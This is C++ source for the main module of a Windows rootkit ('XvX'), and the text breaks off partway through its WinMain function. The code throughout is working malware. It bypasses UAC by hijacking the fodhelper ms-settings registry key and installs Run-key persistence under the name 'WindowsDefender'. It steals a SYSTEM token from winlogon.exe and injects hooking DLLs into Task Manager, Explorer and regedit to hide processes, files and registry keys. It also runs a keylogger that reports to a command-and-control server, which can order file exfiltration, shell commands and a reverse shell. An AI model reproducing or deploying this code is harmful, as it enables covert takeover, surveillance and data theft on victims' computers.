/*
 * XvX Rootkit - Main Component
 * Copyright (c) 2025 - 28zaakypro@proton.me
 *
 * NT AUTHORITY\SYSTEM privilege escalation rootkit with C2 capabilities.
 * Features: UAC bypass, token stealing, process/file/registry hiding,
 * interactive SYSTEM shell, DLL injection, WMI monitoring.
 */

#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdio>
#include <fstream>
#include "../include/IPCObjects_File.h"
#include "../include/multiDLLInjector.h"
#include "../include/AntiAnalysis.h"
#include "../include/C2Client.h"
#include "../include/Keylogger.h"

using namespace std;

// Production mode: disable all console output
#ifndef _DEBUG
#define SILENT_MODE 1
#else
#define SILENT_MODE 0
#endif

vector<wstring> agentVector;    // Processes to hide
vector<wstring> pathVector;     // Files/folders to hide
vector<wstring> registryVector; // Registry keys to hide

HANDLE g_systemToken = NULL; // Global SYSTEM token

struct InteractiveShell
{
    HANDLE hInputWrite = NULL;
    HANDLE hOutputRead = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    wstring outputBuffer;
    bool active = false;
    CRITICAL_SECTION cs;
} g_shell;

void InitShell()
{
    InitializeCriticalSection(&g_shell.cs);
}

bool StartInteractiveShell()
{
    if (g_shell.active)
        return true;

    // Ensure critical section is initialized
    if (g_shell.cs.DebugInfo == NULL) {
        InitShell();
    }

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hOutputWrite = NULL, hInputRead = NULL;

    // Create pipe for stdout
    if (!CreatePipe(&g_shell.hOutputRead, &hOutputWrite, &sa, 0))
    {
        return false;
    }

    // Create pipe for stdin
    if (!CreatePipe(&hInputRead, &g_shell.hInputWrite, &sa, 0))
    {
        CloseHandle(g_shell.hOutputRead);
        CloseHandle(hOutputWrite);
        return false;
    }

    // Handles that must NOT be inherited by child process
    SetHandleInformation(g_shell.hOutputRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_shell.hInputWrite, HANDLE_FLAG_INHERIT, 0);

    // Configure STARTUPINFO for pipe redirection
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;

    // Launch cmd.exe with UTF-8 and English locale
    wchar_t cmdLine[] = L"cmd.exe /K chcp 65001 >nul && set LANG=en_US.UTF-8";
    BOOL success = FALSE;

    if (g_systemToken != NULL)
    {
        // Method: CreateProcessWithTokenW (more reliable)
        success = CreateProcessWithTokenW(
            g_systemToken,
            0,
            NULL,
            cmdLine,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi);

        // Method: Fallback to CreateProcessAsUserW if Method 1 fails
        if (!success)
        {
            success = CreateProcessAsUserW(
                g_systemToken,
                NULL,
                cmdLine,
                NULL,
                NULL,
                TRUE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi);
        }
    }

    // Fallback: Use normal CreateProcessW if no SYSTEM token
    if (!success)
    {
        success = CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    if (!success)
    {
        CloseHandle(g_shell.hOutputRead);
        CloseHandle(hOutputWrite);
        CloseHandle(hInputRead);
        CloseHandle(g_shell.hInputWrite);
        return false;
    }

    // Close handles inherited by child (keep only our copies)
    CloseHandle(hOutputWrite);
    CloseHandle(hInputRead);

    g_shell.hProcess = pi.hProcess;
    g_shell.hThread = pi.hThread;
    g_shell.active = true;
    g_shell.outputBuffer.clear();

    return true;
}

wstring ReadShellOutput()
{
    if (!g_shell.active)
        return L"";

    EnterCriticalSection(&g_shell.cs);

    char buffer[4096];
    DWORD bytesRead;
    wstring output;

    // Get console output codepage for proper encoding
    UINT codepage = GetConsoleOutputCP();
    if (codepage == 0)
        codepage = CP_OEMCP;

    while (PeekNamedPipe(g_shell.hOutputRead, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0)
    {
        if (ReadFile(g_shell.hOutputRead, buffer, min(sizeof(buffer) - 1, (size_t)bytesRead), &bytesRead, NULL))
        {
            buffer[bytesRead] = '\0';
            // Use console codepage for proper encoding (handles accents)
            int wlen = MultiByteToWideChar(codepage, 0, buffer, bytesRead, NULL, 0);
            if (wlen > 0)
            {
                wchar_t *wbuf = new wchar_t[wlen + 1];
                MultiByteToWideChar(codepage, 0, buffer, bytesRead, wbuf, wlen);
                wbuf[wlen] = L'\0';
                output += wbuf;
                delete[] wbuf;
            }
        }
        else
        {
            break;
        }
    }

    g_shell.outputBuffer += output;
    wstring result = g_shell.outputBuffer;
    g_shell.outputBuffer.clear();

    LeaveCriticalSection(&g_shell.cs);
    return result;
}

void WriteShellInput(const wstring &cmd)
{
    if (!g_shell.active)
        return;

    EnterCriticalSection(&g_shell.cs);

    string cmdA(cmd.begin(), cmd.end());
    cmdA += "\r\n";
    DWORD bytesWritten;
    WriteFile(g_shell.hInputWrite, cmdA.c_str(), (DWORD)cmdA.size(), &bytesWritten, NULL);

    LeaveCriticalSection(&g_shell.cs);
}

bool UACBypass()
{
    // Check if already admin
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    if (isAdmin)
    {
        return true;
    }

    // Get full path of our EXE
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // Create registry hijack key
    HKEY hKey;
    LONG result = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result != ERROR_SUCCESS)
    {
        return false;
    }

    // Set default value (our EXE)
    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE *)exePath,
                   (wcslen(exePath) + 1) * sizeof(WCHAR));

    // Set empty DelegateExecute
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE *)L"", sizeof(WCHAR));

    RegCloseKey(hKey);

    // Launch fodhelper.exe to execute payload as admin
    SHELLEXECUTEINFOW sei = {sizeof(sei)};
    sei.lpVerb = L"open";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;

    if (ShellExecuteExW(&sei))
    {
        // Wait for new process to start
        Sleep(2000);

        // Clean up registry keys
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");

        // Terminate this process (new admin takes over)
        ExitProcess(0);
    }

    return false;
}

void addPersistence()
{
    // 1. Get full path of current EXE
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // 2. Open Registry Run key
    HKEY hKey;
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey);

    if (result != ERROR_SUCCESS)
    {
        wcout << L"[!] Failed to open registry key" << endl;
        return;
    }

    // 3. Add value
    result = RegSetValueExW(
        hKey,
        L"WindowsDefender",
        0,
        REG_SZ,
        (BYTE *)exePath,
        (wcslen(exePath) + 1) * sizeof(WCHAR));

    RegCloseKey(hKey);

    #ifdef _DEBUG
    if (result == ERROR_SUCCESS)
    {
        wcout << L"[+] Persistence installed (Registry Run Key)" << endl;
    }
    else
    {
        wcout << L"[!] Failed to install persistence" << endl;
    }
    #endif
}

// Global C2 pointer for keylogger callback
C2Client* g_c2Client = nullptr;

// Callback function for keylogger
void OnKeylogData(const wstring& keylog)
{
    if (g_c2Client != nullptr)
    {
        // Generate unique command ID for keylog
        wstring commandID = L"keylog_" + to_wstring(GetTickCount64());
        
        // Send keylog to C2 server (commandID, status, output)
        g_c2Client->sendResult(commandID, L"success", keylog);
        wcout << L"[+] Keylog data sent to C2 (" << keylog.size() << L" chars)" << endl;
    }
}

void showHelp()
{
    wcout << L"\n========================================" << endl;
    wcout << L"  XvX UserMode Rootkit - Help" << endl;
    wcout << L"========================================\n"
          << endl;

    wcout << L"COMMANDS:\n"
          << endl;
    wcout << L"  Process Hiding:" << endl;
    wcout << L"    rootkit.exe process hide <processname.exe>" << endl;
    wcout << L"    rootkit.exe process show\n"
          << endl;

    wcout << L"  File/Directory Hiding:" << endl;
    wcout << L"    rootkit.exe path hide <C:\\path\\to\\folder>" << endl;
    wcout << L"    rootkit.exe path show\n"
          << endl;

    wcout << L"  Registry Hiding:" << endl;
    wcout << L"    rootkit.exe registry hide <KeyName>" << endl;
    wcout << L"    rootkit.exe registry show\n"
          << endl;

    wcout << L"EXAMPLES:\n"
          << endl;
    wcout << L"  rootkit.exe process hide malware.exe" << endl;
    wcout << L"  rootkit.exe path hide C:\\Users\\Public\\Music" << endl;
    wcout << L"  rootkit.exe registry hide MyHiddenKey" << endl;

    wcout << L"\n========================================\n"
          << endl;
}

void processCommand(const wstring &type, const wstring &action, const wstring &value = L"")
{

    if (type == L"process")
    {
        if (action == L"hide" && !value.empty())
        {
            // Add process to hide
            try
            {
                agentVector = deserializeWStringVector(L"agentMapped");
            }
            catch (...)
            {
                agentVector.clear();
            }

            agentVector.push_back(value);
            Serialitzator::serializeVectorWString(agentVector, L"agentMapped");

            wcout << L"[+] Process added to hide list: " << value << endl;

            // Inject Hooks.dll if active
            int taskmgrPID = getPIDbyProcName("taskmgr.exe");
            if (taskmgrPID != 0)
            {
                char dllPath[MAX_PATH];
                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
                // Replace rootkit.exe with processHooks\\processHooks.dll
                string pathStr(dllPath);
                size_t pos = pathStr.find_last_of("\\");
                if (pos != string::npos) {
                    pathStr = pathStr.substr(0, pos) + "\\processHooks\\processHooks.dll";
                }

                if (injectDLL(pathStr, taskmgrPID))
                {
                    wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
                }
            }
        }
        else if (action == L"show")
        {
            try
            {
                agentVector = deserializeWStringVector(L"agentMapped");
                wcout << L"\n[*] Hidden processes (" << agentVector.size() << L"):" << endl;
                for (const auto &proc : agentVector)
                {
                    wcout << L"  - " << proc << endl;
                }
            }
            catch (...)
            {
                wcout << L"[i] No hidden processes" << endl;
            }
        }
    }
    else if (type == L"path")
    {
        if (action == L"hide" && !value.empty())
        {
            try
            {
                pathVector = deserializeWStringVector(L"pathMapped");
            }
            catch (...)
            {
                pathVector.clear();
            }

            pathVector.push_back(value);
            Serialitzator::serializeVectorWString(pathVector, L"pathMapped");

            wcout << L"[+] Path added to hide list: " << value << endl;

            // Inject Hooks.dll if active
            int explorerPID = getPIDbyProcName("explorer.exe");
            if (explorerPID != 0)
            {
                char dllPath[MAX_PATH];
                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
                string pathStr(dllPath);
                size_t pos = pathStr.find_last_of("\\");
                if (pos != string::npos) {
                    pathStr = pathStr.substr(0, pos) + "\\fileHooks\\fileHooks.dll";
                }

                if (injectDLL(pathStr, explorerPID))
                {
                    wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
                }
            }
        }
        else if (action == L"show")
        {
            try
            {
                pathVector = deserializeWStringVector(L"pathMapped");
                wcout << L"\n[*] Hidden paths (" << pathVector.size() << L"):" << endl;
                for (const auto &path : pathVector)
                {
                    wcout << L"  - " << path << endl;
                }
            }
            catch (...)
            {
                wcout << L"[i] No hidden paths" << endl;
            }
        }
    }
    else if (type == L"registry")
    {
        if (action == L"hide" && !value.empty())
        {
            try
            {
                registryVector = deserializeWStringVector(L"registryMapped");
            }
            catch (...)
            {
                registryVector.clear();
            }

            registryVector.push_back(value);
            Serialitzator::serializeVectorWString(registryVector, L"registryMapped");

            wcout << L"[+] Registry key added to hide list: " << value << endl;

            // Inject Hooks.dll if active
            int regeditPID = getPIDbyProcName("regedit.exe");
            if (regeditPID != 0)
            {
                char dllPath[MAX_PATH];
                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
                string pathStr(dllPath);
                size_t pos = pathStr.find_last_of("\\");
                if (pos != string::npos) {
                    pathStr = pathStr.substr(0, pos) + "\\registryHooks\\registryHooks.dll";
                }

                if (injectDLL(pathStr, regeditPID))
                {
                    wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
                }
            }
        }
        else if (action == L"show")
        {
            try
            {
                registryVector = deserializeWStringVector(L"registryMapped");
                wcout << L"\n[*] Hidden registry keys (" << registryVector.size() << L"):" << endl;
                for (const auto &key : registryVector)
                {
                    wcout << L"  - " << key << endl;
                }
            }
            catch (...)
            {
                wcout << L"[i] No hidden registry keys" << endl;
            }
        }
    }
}

DWORD WINAPI c2ModeThread(LPVOID lpParam)
{
    C2Client *c2 = (C2Client *)lpParam;
    c2->setActive(true);
    
    #ifdef _DEBUG
    wcout << L"[C2] Thread started, sending initial beacon..." << endl;
    #endif

    while (c2->isRunning())
    {
        try
        {
            // Beacon to C2 (immediately on first loop, then after sleep)
            vector<wstring> commands = c2->checkIn();
            #ifdef _DEBUG
            wcout << L"[C2] Beacon sent, received " << commands.size() << L" command(s)" << endl;
            #endif

            // Process each command
            for (const wstring &cmdLine : commands)
            {
                // Parser: CMD|ARG1|ARG2 (optional args)
                size_t pos = cmdLine.find(L'|');
                wstring cmd, args;

                if (pos == wstring::npos)
                {
                    // Command without arguments
                    cmd = cmdLine;
                    args = L"";
                }
                else
                {
                    cmd = cmdLine.substr(0, pos);
                    args = cmdLine.substr(pos + 1);
                }

                wstring result;

                // Hide commands
                if (cmd == L"hide_process")
                {
                    processCommand(L"process", L"hide", args);
                    result = L"Process hidden: " + args;
                }
                else if (cmd == L"hide_file")
                {
                    processCommand(L"path", L"hide", args);
                    result = L"File hidden: " + args;
                }
                else if (cmd == L"hide_registry")
                {
                    processCommand(L"registry", L"hide", args);
                    result = L"Registry key hidden: " + args;
                }
                // Unhide commands
                else if (cmd == L"unhide_process")
                {
                    // Remove from agentVector
                    auto &vec = agentVector;
                    vec.erase(remove(vec.begin(), vec.end(), args), vec.end());
                    Serialitzator::serializeVectorWString(vec, L"agentMapped");
                    result = L"Process unhidden: " + args;
                }
                else if (cmd == L"unhide_all")
                {
                    agentVector.clear();
                    pathVector.clear();
                    registryVector.clear();
                    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
                    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
                    Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
                    result = L"All items unhidden";
                }
                // File exfiltration
                else if (cmd == L"exfil")
                {
                    // Convert wstring to string for ifstream
                    string filePathA(args.begin(), args.end());
                    ifstream file(filePathA, ios::binary);
                    if (file)
                    {
                        stringstream buffer;
                        buffer << file.rdbuf();
                        string dataA = buffer.str();
                        wstring data(dataA.begin(), dataA.end());
                        result = L"EXFIL|" + data;
                    }
                    else
                    {
                        result = L"ERROR|File not found: " + args;
                    }
                }
                // Shell command execution
                else if (cmd == L"shell")
                {
                    wchar_t buffer[4096];
                    FILE *pipe = _wpopen((L"cmd.exe /c " + args).c_str(), L"r");
                    if (pipe)
                    {
                        wstring output;
                        while (fgetws(buffer, 4096, pipe))
                        {
                            output += buffer;
                        }
                        _pclose(pipe);
                        result = L"SHELL|" + output;
                    }
                    else
                    {
                        result = L"ERROR|Failed to execute command";
                    }
                }

                // Change beacon interval
                else if (cmd == L"sleep")
                {
                    DWORD seconds = (DWORD)_wtoi(args.c_str());
                    c2->setBeaconInterval(seconds);
                    result = L"Beacon interval set to " + args + L" seconds";
                }
                // Privilege Escalation vers SYSTEM
                else if (cmd == L"privesc")
                {
                    // Token Stealing from winlogon.exe to obtain SYSTEM
                    HANDLE hToken = NULL;
                    HANDLE hNewToken = NULL;
                    DWORD winlogonPID = 0;

                    // Find winlogon.exe
                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                    if (hSnapshot != INVALID_HANDLE_VALUE)
                    {
                        PROCESSENTRY32W pe = {sizeof(pe)};
                        if (Process32FirstW(hSnapshot, &pe))
                        {
                            do
                            {
                                if (wcscmp(pe.szExeFile, L"winlogon.exe") == 0)
                                {
                                    winlogonPID = pe.th32ProcessID;
                                    break;
                                }
                            } while (Process32NextW(hSnapshot, &pe));
                        }
                        CloseHandle(hSnapshot);
                    }

                    if (winlogonPID == 0)
                    {
                        result = L"ERROR|winlogon.exe not found";
                    }
                    else
                    {
                        // Enable SeDebugPrivilege
                        HANDLE hCurrentToken;
                        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
                        {
                            TOKEN_PRIVILEGES tp;
                            LUID luid;
                            if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
                            {
                                tp.PrivilegeCount = 1;
                                tp.Privileges[0].Luid = luid;
                                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                                AdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(tp), NULL, NULL);
                            }
                            CloseHandle(hCurrentToken);
                        }

                        // Open winlogon.exe
                        HANDLE hWinlogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPID);
                        if (hWinlogon)
                        {
                            // Steal SYSTEM token
                            if (OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
                            {
                                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
                                {
                                    // Store the token for CreateProcessAsUser
                                    if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
                                        CloseHandle(g_systemToken);
                                    g_systemToken = hNewToken;

                                    // Impersonate SYSTEM
                                    if (ImpersonateLoggedOnUser(g_systemToken))
                                    {
                                        result = L"SUCCESS|Now running as NT AUTHORITY\\SYSTEM";
                                    }
                                    else
                                    {
                                        result = L"ERROR|Failed to impersonate SYSTEM token";
                                    }
                                }
                                else
                                {
                                    result = L"ERROR|Failed to duplicate token";
                                }
                                CloseHandle(hToken);
                            }
                            else
                            {
                                result = L"ERROR|Failed to open winlogon token";
                            }
                            CloseHandle(hWinlogon);
                        }
                        else
                        {
                            result = L"ERROR|Failed to open winlogon process (need admin rights)";
                        }
                    }
                }
                // Interactive SYSTEM shell
                else if (cmd == L"shell" && args.find(L"system ") == 0)
                {
                    // Extract the real command after "system "
                    wstring realCmd = args.substr(7); // Skip "system "

                    // Execute cmd.exe with the current SYSTEM token
                    wchar_t buffer[65536];
                    FILE *pipe = _wpopen((L"cmd.exe /c " + realCmd).c_str(), L"r");
                    if (pipe)
                    {
                        wstring output;
                        while (fgetws(buffer, 65536, pipe))
                        {
                            output += buffer;
                        }
                        _pclose(pipe);

                        result = output.empty() ? L"[Command executed - no output]" : output;
                    }
                    else
                    {
                        result = L"ERROR|Failed to create shell";
                    }
                }
                // Stop interactive reverse shell
                else if (cmd == L"revshell_stop")
                {
                    if (!g_shell.active)
                    {
                        result = L"SUCCESS|Shell not active";
                    }
                    else
                    {
                        EnterCriticalSection(&g_shell.cs);

                        // Close handles
                        if (g_shell.hInputWrite)
                        {
                            CloseHandle(g_shell.hInputWrite);
                            g_shell.hInputWrite = NULL;
                        }
                        if (g_shell.hOutputRead)
                        {
                            CloseHandle(g_shell.hOutputRead);
                            g_shell.hOutputRead = NULL;
                        }

                        // Terminate the cmd.exe process
                        if (g_shell.hProcess)
                        {
                            TerminateProcess(g_shell.hProcess, 0);
                            CloseHandle(g_shell.hProcess);
                            g_shell.hProcess = NULL;
                        }
                        if (g_shell.hThread)
                        {
                            CloseHandle(g_shell.hThread);
                            g_shell.hThread = NULL;
                        }

                        g_shell.active = false;
                        g_shell.outputBuffer.clear();

                        LeaveCriticalSection(&g_shell.cs);

                        result = L"SUCCESS|Shell stopped";
                    }
                }
                // Start interactive reverse shell
                else if (cmd == L"revshell_start")
                {
                    // Check WITHOUT starting if shell already active
                    if (g_shell.active)
                    {
                        result = L"SUCCESS|Shell already active";
                    }
                    else
                    {
                        // Send SUCCESS IMMEDIATELY before starting the shell
                        result = L"SUCCESS|Starting shell...";
                        c2->sendResult(cmd, L"OK", result);

                        // NOW start the shell (in the background)
                        try
                        {
                            BOOL shellStarted = StartInteractiveShell();
                            if (!shellStarted)
                            {
                                // If failed, send a second error result
                                c2->sendResult(cmd, L"ERROR", L"CreateProcess failed");
                            }
                        }
                        catch (...)
                        {
                            c2->sendResult(cmd, L"ERROR", L"Exception during shell start");
                        }
                        continue; // Skip the normal sendResult (already sent)
                    }
                }
                // Send command to reverse shell
                else if (cmd == L"revshell_input")
                {
                    if (g_shell.active)
                    {
                        WriteShellInput(args);

                        wstring output;

                        // Phase 1: Rapid polling for quick commands (whoami, hostname, etc.)
                        // Starts immediately after WriteShellInput - no initial delay
                        bool gotOutput = false;
                        for (int i = 0; i < 40; i++)
                        {
                            Sleep(50); // 50ms between reads = total 2 seconds max
                            wstring chunk = ReadShellOutput();
                            if (!chunk.empty())
                            {
                                output += chunk;
                                gotOutput = true;
                                // Continue reading for 300ms after first output
                                Sleep(100);
                                output += ReadShellOutput();
                                Sleep(100);
                                output += ReadShellOutput();
                                Sleep(100);
                                output += ReadShellOutput();
                                break;
                            }
                        }

                        // Phase 2: If no output, command may be slow, progressive wait
                        if (!gotOutput)
                        {
                            Sleep(500);
                            output = ReadShellOutput();

                            if (output.empty())
                            {
                                // Last attempt for very slow commands
                                for (int i = 0; i < 5; i++)
                                {
                                    Sleep(200);
                                    wstring chunk = ReadShellOutput();
                                    if (!chunk.empty())
                                    {
                                        output += chunk;
                                        break;
                                    }
                                }
                            }
                        }

                        // Final read to capture remaining data
                        Sleep(100);
                        wstring final = ReadShellOutput();
                        if (!final.empty())
                            output += final;

                        result = output.empty() ? L"[No output - command may still be running]" : output;
                    }
                    else
                    {
                        result = L"ERROR|Shell not active - use revshell_start first";
                    }
                }
                // Retrieve output from reverse shell
                else if (cmd == L"revshell_output")
                {
                    if (g_shell.active)
                    {
                        wstring output;
                        // Read in a loop for up to 2 seconds
                        for (int i = 0; i < 20; i++)
                        {
                            Sleep(100);
                            wstring chunk = ReadShellOutput();
                            if (!chunk.empty())
                            {
                                output += chunk;
                                // Wait for remaining output
                                Sleep(200);
                                chunk = ReadShellOutput();
                                if (!chunk.empty())
                                    output += chunk;
                                break;
                            }
                        }
                        result = output.empty() ? L"[No output]" : output;
                    }
                    else
                    {
                        result = L"ERROR|Shell not active";
                    }
                }
                // Stop rootkit
                else if (cmd == L"die")
                {
                    c2->setActive(false);
                    result = L"Rootkit stopping";
                }
                else
                {
                    result = L"ERROR|Unknown command: " + cmd;
                }

                // Send result to C2
                c2->sendResult(cmd, L"OK", result);
            }
        }
        catch (...)
        {
            // Exception caught -> do not crash the thread
            // Beacon continues next cycle
        }

        // Wait before next beacon
        // Fast polling if shell active (1s), normal otherwise (60s)
        DWORD sleepTime = g_shell.active ? 1000 : c2->getBeaconInterval();
        Sleep(sleepTime);
    }

    return 0;
}

void initLocalConfig()
{
    // Default targets
    agentVector.clear();
    pathVector.clear();
    registryVector.clear();

    // Example: hide default payload
    // agentVector.push_back(L"malware.exe");
    // pathVector.push_back(L"C:\\Payloads");
    // registryVector.push_back(L"BadKey");

    // SSerialize to IPC
    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
    Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{

    // Attempt UAC bypass if not admin
    if (!UACBypass())
    {
        // Fallback, continue anyway (degraded mode without privesc)
    }

    // From here, we are admin (if the bypass worked)

    // Initialize interactive shell
    InitShell();

    // Anti-VM and anti-debugging check
    // DISABLED FOR TESTING ON VMs
    /*
    #ifndef _DEBUG
    if (isDebuggerPresent_Check() || isRunningInVM()) {
        return 1; // Exit silently if detected
    }
    #endif
    */

    // Allocate console ONLY in debug mode
    #ifdef _DEBUG
    AllocConsole();
    FILE *fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    
    wcout << L"\n========================================" << endl;
    wcout << L"  XvX UM Rootkit v2.0 [HYBRID MODE]" << endl;
    wcout << L"========================================\n" << endl;
    #endif

    initLocalConfig();
    
    #ifdef _DEBUG
    wcout << L"[+] Local configuration loaded" << endl;
    #endif

    // Read C2 URL from file (optional)
    wstring c2URL = L"https://127.0.0.1:8443";

    // Get the path of the exe folder
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    string exeDir(exePath);
    size_t lastSlash = exeDir.find_last_of("\\/");
    if (lastSlash != string::npos)
    {
        exeDir = exeDir.substr(0, lastSlash + 1);
    }
    string configPath = exeDir + "c2_config.txt";

    // Read ALL URLs from the file and try each until one works
    vector<wstring> c2URLs;
    ifstream configFile(configPath);
    if (configFile.is_open())
    {
        string urlA;
        while (getline(configFile, urlA))
        {
            // Clean the string (remove \r\n and invisible characters)
            urlA.erase(std::remove_if(urlA.begin(), urlA.end(),
                                      [](char c)
                                      { return c == '\r' || c == '\n' || c == '\0'; }),
                       urlA.end());

            // Convert ASCII to wstring and add to the list
            if (!urlA.empty())
            {
                try
                {
                    wstring url = wstring(urlA.begin(), urlA.end());
                    c2URLs.push_back(url);
                }
                catch (...)
                {
                    // Ignore invalid lines
                }
            }
        }
        configFile.close();

        #ifdef _DEBUG
        if (!c2URLs.empty())
        {
            wcout << L"[*] " << c2URLs.size() << L" C2 URLs detected in config" << endl;
        }
        #endif
    }
    else
    {
        #ifdef _DEBUG
        wcout << L"[*] No c2_config.txt, using default URL" << endl;
        #endif
        c2URLs.push_back(c2URL);
    }

    // Use default URL if none configured
    if (c2URLs.empty())
    {
        c2URLs.push_back(c2URL);
    }

    // Try each URL until one works
    bool c2Available = false;
    C2Client *c2 = nullptr;

    for (const auto &url : c2URLs)
    {
        c2 = new C2Client(url);
        c2Available = c2->testConnection();

        if (c2Available)
        {
            c2URL = url;
            #ifdef _DEBUG
            wcout << L"[+] C2 available: " << c2URL << endl;
            wcout << L"[+] Agent ID: " << c2->getAgentID() << endl;
            #endif
            break;
        }
        else
        {
            #ifdef _DEBUG
            wcout << L"[-] Connection failed: " << url << endl;
            #endif
            delete c2;
            c2 = nullptr;
        }
    }

    if (c2Available && c2)
    {
        // Start C2 thread in the background
        CreateThread(NULL, 0, c2ModeThread, (LPVOID)c2, 0, NULL);
        #ifdef _DEBUG
        wcout << L"[+] C2 mode active (beacon interval: " << c2->getBeaconInterval() / 1000 << L"s)" << endl;
        #endif
    }
    else
    {
        #ifdef _DEBUG
        wcout << L"[i] C2 unavailable - local mode only" << endl;
        #endif
    }

    // Parse command line arguments
    int argc;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    // Case 1: No arguments (first launch)
    if (argc == 1)
    {
        #ifdef _DEBUG
        wcout << L"[*] First launch detected" << endl;
        #endif

        // Initialize empty File Mapping Objects
        vector<wstring> empty;
        Serialitzator::serializeVectorWString(empty, L"agentMapped");
        Serialitzator::serializeVectorWString(empty, L"pathMapped");
        Serialitzator::serializeVectorWString(empty, L"registryMapped");
        
        #ifdef _DEBUG
        wcout << L"[+] File Mapping Objects initialized" << endl;
        #endif

        // Inject DLLs into existing processes
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        string baseDir(exePath);
        size_t pos = baseDir.find_last_of("\\");
        baseDir = baseDir.substr(0, pos);

        // Inject Hooks.dll if active
        int taskmgrPID = getPIDbyProcName("taskmgr.exe");
        if (taskmgrPID != 0)
        {
            string dllPath = baseDir + "\\processHooks\\processHooks.dll";
            if (injectDLL(dllPath, taskmgrPID))
            {
                #ifdef _DEBUG
                wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
                #endif
            }
        }

        // Inject fileHooks.dll into explorer.exe
        int explorerPID = getPIDbyProcName("explorer.exe");
        if (explorerPID != 0)
        {
            string dllPath = baseDir + "\\fileHooks\\fileHooks.dll";
            if (injectDLL(dllPath, explorerPID))
            {
                #ifdef _DEBUG
                wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
                #endif
            }
        }

        // Inject Hooks.dll if active
        int regeditPID = getPIDbyProcName("regedit.exe");
        if (regeditPID != 0)
        {
            string dllPath = baseDir + "\\registryHooks\\registryHooks.dll";
            if (injectDLL(dllPath, regeditPID))
            {
                #ifdef _DEBUG
                wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
                #endif
            }
        }

        // Install persistence
        addPersistence();

        // Start keylogger if C2 is available
        if (c2)
        {
            g_c2Client = c2;
            if (Keylogger::Start(OnKeylogData))
            {
                #ifdef _DEBUG
                wcout << L"[+] Keylogger active (WH_KEYBOARD_LL hook)" << endl;
                #endif
            }
            else
            {
                #ifdef _DEBUG
                wcout << L"[!] Failed to start keylogger" << endl;
                #endif
            }
        }

        #ifdef _DEBUG
        wcout << L"\n[+] Rootkit active!" << endl;
        wcout << L"[i] Demon mode - Rootkit running in background" << endl;
        wcout << L"[i] C2 beacon every " << (c2 ? c2->getBeaconInterval() / 1000 : 60) << L"s" << endl;
        #endif

        LocalFree(argv);

